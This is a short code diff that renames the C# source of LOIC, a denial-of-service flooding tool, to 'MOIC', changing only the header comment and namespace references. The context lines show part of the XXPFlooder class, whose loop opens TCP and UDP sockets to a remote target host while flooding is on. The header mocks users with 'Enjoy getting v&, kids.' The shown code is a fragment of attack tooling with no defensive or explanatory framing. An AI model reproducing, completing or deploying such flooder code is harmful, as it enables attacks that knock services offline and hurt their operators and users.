@@ -1,4 +1,4 @@
-/* LOIC - Low Orbit Ion Cannon
+/* MOIC - Medium Orbit Ion Cannon
  * Released to the public domain
  * Enjoy getting v&, kids.
  */
@@ -8,7 +8,7 @@ using System.ComponentModel;
 using System.Net;
 using System.Net.Sockets;
 
-namespace LOIC
+namespace MOIC
 {
 	public class XXPFlooder : cHLDos
 	{
@@ -54,7 +54,7 @@ namespace LOIC
 				while (this.IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
-					if(Protocol == (int)LOIC.Protocol.TCP)
+					if(Protocol == (int)MOIC.Protocol.TCP)
 					{
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 						{
@@ -80,7 +80,7 @@ namespace LOIC
 							catch { Failed++; }
 						}
 					}
-					if(Protocol == (int)LOIC.Protocol.UDP)
+					if(Protocol == (int)MOIC.Protocol.UDP)
 					{
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
 						{
